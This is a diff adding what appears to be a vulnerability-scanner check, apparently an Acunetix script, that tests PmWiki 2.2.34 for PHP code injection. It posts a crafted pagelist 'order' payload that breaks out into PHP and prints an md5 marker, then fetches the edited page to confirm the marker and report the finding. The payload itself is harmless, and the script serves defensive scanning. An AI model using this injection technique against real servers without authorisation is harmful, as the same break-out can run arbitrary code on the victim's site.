@@ -1,0 +1,52 @@
+#include helpers.inc;
+#include reporting_helpers.inc;
+#include string_helpers.inc;
+// **************************************************************************************
+function test_pmwiki_2234_php_code_execution(dir, path){
+	if (!path.endsWith('/')) path = path + '/';
+	
+	var http = new THTTPJob();
+	http.url = dir.url;
+	http.verb = 'POST';
+	http.uri = path + 'pmwiki.php';
+	http.request.addHeader('Content-type', 'application/x-www-form-urlencoded', true);
+	http.addCookies = false;
+	http.request.body = "action=edit&post=save&n=Acunetix.Test&text=(:pagelist order=']);print(md5(acunetix));die;#:)";
+	
+	http.execute();	
+	
+	if ((!http.wasError && http.responseStatus == 302)){
+		var http2 = new THTTPJob();
+		http2.url = dir.url;
+		http2.verb = 'POST';
+		http2.uri = path + 'pmwiki.php';
+		http2.request.addHeader('Content-type', 'application/x-www-form-urlencoded', true);
+		http2.addCookies = false;
+		http2.request.body = 'n=Acunetix.Test';
+		
+		http2.execute();			
+		if ((!http2.wasError && http2.responseStatus == 200)){
+			if(http2.response.body && http2.response.body.indexOf("082119f75623eb7abd7bf357698ff66c") != -1) {
+					var ri = new TReportItem();
+					
+					ri.LoadFromFile("PHP_Code_Injection.xml");
+					ri.affects = path + 'pmwiki.php';
+					ri.alertPath = "Scripts/PHP Code Injection";
+					ri.parameter = 'text';
+					ri.parameterValue = "(:pagelist order=']);print(md5(acunetix));die;#:)";
+					
+					ri.details = "POST input [bold][dark]text[/dark][/bold] was set to [bold][dark]" + ri.parameterValue + "[/dark][/bold]";
+					ri.setHttpInfo(http);		
+					AddReportItem(ri);				
+			}
+		}
+	}
+}
+var dir = getCurrentDirectory();
+var alreadyReportedWebApplication = getGlobalValue("detectedAppPmWiki");
+if (!alreadyReportedWebApplication)
+{
+    setGlobalValue("detectedAppPmWiki", 1, true);           
+    KBase("PmWiki web application", "PmWiki web application was detected in directory [dark][bold]" + dir.fullPath + "[/bold][/dark].");
+}
+test_pmwiki_2234_php_code_execution(dir, dir.fullPath);
